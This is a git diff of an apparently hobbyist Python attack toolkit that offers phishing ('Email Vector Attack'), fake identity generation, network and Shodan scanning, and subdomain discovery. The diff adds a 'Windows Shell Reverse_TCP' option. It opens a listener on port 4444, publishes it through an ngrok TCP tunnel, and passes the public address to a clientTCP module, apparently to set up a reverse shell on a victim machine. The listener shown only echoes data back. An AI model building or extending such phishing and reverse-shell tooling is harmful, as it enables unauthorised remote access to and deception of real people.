@@ -6,11 +6,12 @@ import http.server
 import os
 import sys
 import cgi
-import nmap
+import clientTCP
 import lxml.html
 import SendEmail
 import smtplib, ssl
 import requests
+import socket
 from lxml import etree
 from faker import Faker
 from colorama import Fore
@@ -73,6 +74,7 @@ def phishing_atck():
     while(opt != 0):
         opt = int(input(bcolors.OKCYAN + """1) Email Vector Attack
 2) Create a Fake ID
+3) Windows Shell Reverse_TCP
 0) Exit
 CMD> """ + bcolors.ENDC))
         if opt == 1:
@@ -86,13 +88,31 @@ CMD> """ + bcolors.ENDC))
             input()
             ngrok.disconnect(tunnel)
             break
-        elif opt == 2:
+        if opt == 2:
             fake = Faker()
             print("Name: ", fake.name())
             print("Email: ", fake.email())
             print("Country: ", fake.country())
             print("Text: ", fake.text())
-
+        if opt == 3:
+            HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
+            PORT = 4444        # Port to listen on (non-privileged ports are > 1023)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.bind((HOST, PORT))
+                s.listen()
+                tcp_connetion = ngrok.connect(4444, "tcp")
+                print("Starting NgrokTunnel...")
+                print(tcp_connetion)
+                clientTCP.write(tcp_connetion.public_url)
+                conn, addr = s.accept()
+                with conn:
+                    print('Connected by', addr)
+                    while True:
+                        data = conn.recv(1024)
+                        if not data:
+                            break
+                        conn.sendall(data)
+            ngrok.disconnect(tcp_connetion)
 
 if __name__ == "__main__":
     print("""          _______  _        _______  _______
@@ -111,11 +131,11 @@ if __name__ == "__main__":
     parser.add_argument("-host", dest = "host", help = "Target Specification [Optional if you want to scan a network]")
     parser.add_argument("-ports", dest = "ports", help = "Specify the ports for the network scan")
     parser.add_argument("-web", dest = "web", help = "Information gathering with web scraping [Optional / Dont need argument]", action="store_true")
-    parser.add_argument("-subdomains", dest = "domain", help = "This option discover the subdomains of one host or domain")
+    parser.add_argument("-subdomains", dest = "domain", help = "This option discover the subdomains of one host or domain [Example: google.com]")
     parser.add_argument("-shodan", dest = "shodan", help = "Use Shodan API to search public hosts [Optional]")
     parser.add_argument("-s", help = "Social Engineer Mode [Optional / Dont need argument]" , action="store_true")
     params = parser.parse_args()
-    if params.host and params.ports and not params.phishing:
+    if params.host and params.ports and not params.s:
         full_scan(params.host,params.ports)
     elif params.s:
         phishing_atck()
